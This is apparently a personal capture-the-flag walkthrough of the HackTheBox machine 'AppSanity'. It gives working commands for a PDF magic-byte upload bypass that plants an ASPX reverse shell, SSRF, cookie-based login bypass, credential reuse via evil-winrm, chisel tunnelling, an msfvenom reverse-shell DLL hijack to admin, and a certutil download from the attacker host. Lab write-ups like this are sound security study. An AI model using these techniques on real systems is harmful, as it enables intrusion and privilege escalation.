# AppSanity -htb(Compi)
(DLL hijack)


nmap:
	80, 443,5985 (WinRM is active)

Dirb:
	/signin and /signup

		created a new chao user / chao@neil.com / chaoneil1

Subdomain:
	portal.medigi.htb
		requires login and doctor id


---

Making a normal user DOCTOR:
	in the meddigi site , we can register ourselves as a doctoc using burpsuit.
	Intercent the req and change the acc_type to 2.

	After that take the access_token and create a new cookie using firefox dev tool on the portal.meddidig.htb login page and and will bypass the login screen.

This grants us access to the MedDigi Doctor Panel.

---

*****MedDigi Doctor Panel ENUM:
	in a panel named IssuePrescriptions , there is a SSRF vuln.
	Use http://localhost:8080 on the link and it will show you a paitent's pdf.
	Thru this attack vector we can exectute our revershell. 





# Bypass File Upload Restrictions using Magic Bytes
https://youtu.be/KOVPY6zYryM?si=IeSQibMzjPYUMN7_
---
Make a empty text file first and then turn that file into pdf(use online tool)

Go to burp and capture the upload req.
Take the pdf header content starting from magic bytes till the end of file line (EOF).

Now we will capture the req again but this time the file will be aspx rev shell, 
Capture the req and add the magicbyte and pdf header after the EOF of your aspx file and foreward the req. 
And congrats , you have bypassed the pdf upload and uploaded a aspx rev shell.



**EDIT**:
	the prev method didnt work.
	I just added this `%PDF-1.5` to the shell.aspx file and changed the content-type header to application/pdf and the rev shell worked.

Rev shell trigger path:
`http://127.0.0.1:8080/ViewReport.aspx?file=a606b484-bd29-4b81-bbc7-cb36cc89d8dd_shell.aspx`
have to wait 10 secs for the connection to be complete.

---

USER ENUM: (SHELL)
	Got userflag on the same place . Desktop.

---

**PRIV ESC ENUM:

There is a sus .dll file on inetpub(default location for IIS sites). After opening it , i find it mentioned a db. SUS indeed. but to fully scan it or view it i need a software called DnSpy.
so i have to cpy it to my kali machine.

check open/active connections/ports:
	`netstat -aon

To copy files from windows to kali:
	on kali: (create a shared folder named folder in downloads and make it accesable by other networks)
	
`sudo impacket-smbserver folder ~/Downloads -smb2support  
	
on windows: (using the `\\kali-ip\share-name` format in Windows):
`copy ExaminationManagement.dll \\myKaliIP\\folder\ExaminationManagement.dll


After copying now we scan the .dll file.


**Scan with DnSPY**:
	so now i am going to copy the dll file from my kali machine to my host windows machine to properly use dnspy.


	registry key values(it shows you where the password is on the windows machine):
		HKEY_LOCAL_MACHINE\Software\MedDigi  
	    EncKey    REG_SZ    1g0tTh3R3m3dy!!

So this must the the another user devdoc in the machine.

Using EVIL - WinRM i tried to cnnect and it works:
	`evil-winrm -u devdoc -i 10.10.11.238 

This the required lateral movement for this machine.

---

***devdoc ENUM:**   Dll hijacking start.
--
Since we are devdoc user we can go to a previously blocked path.
ReportManagement.exe file is inetetesting. Running Strings on it reveals info. port 100.

Immediately i see chisel.exe after login.
Chisel is a fast TCP/UDP tunnel, transported over HTTP mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.


**port forward with chisel.**:
	`chisel server --reverse --port 4444 (on kali) do this first.
	`./chisel.exe client 10.10.14.10:4444 R:10000:127.0.0.1:100 (on windows)

after doing this , there was a port 100 open. Now since we port forwareded it ,
we can access that service on our local kali machine with nc:
 `nc 127.0.0.1 10000`
	type help and it will list a 'upload' function. We can abuse/dll hijack the upload fucntion.
	 So we place a reverse shell dll file in the reportmangement libraries folder that will be run as root when someone 'uploads' a file from the service, the reverse shell must be named externalupload.dll to pop .

So we need to craft a malicious reverse shell dll first.
	`msfvenom -p windows/x64/shell/reverse_tcp -f dll LHOST=10.10.14.10 LPORT=6666 > externalupload.dll`

And using that same payload , we need to start a meterpreter multi-handler:
	`set PAYLOAD windows/x64/shell/reverse_tcp`

Now we need to put that .dll file into the 'Libraries' folder of 'ReportManagement'.

Keep in mind, the .dll name should be `externalupload.dll`. Ad this was the file name that is needed for the dll hijack to work. We know this by running the `strings` command on 'ReportManagement.exe' on kali. 

---

**Getting SHELL as ADMIN**:
--

After doing all the above steps.
Turn on the msf meterpreter lisetner
Upload the .dll file into the path.
(on kali)Start the service : `nc 127.0.0.1 10000`:
		`upload fakefile
		`Attempting to upload to external source`
This prompt will appear.

At the same time on your listener, you will get a ADMIN shell.

GG

PWNed . Hard it was.



**Articles that helped:
https://ap3x.github.io/posts/pivoting-with-chisel/
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#creating-and-compiling-dlls

command to get files from kali machine from windows.
`certutil.exe -urlcache -f http://10.10.14.10/nc64.exe nc64.exe


cd C:\'Program Files'\ReportManagement\Libraries
cd C:\Users\devdoc\Documents

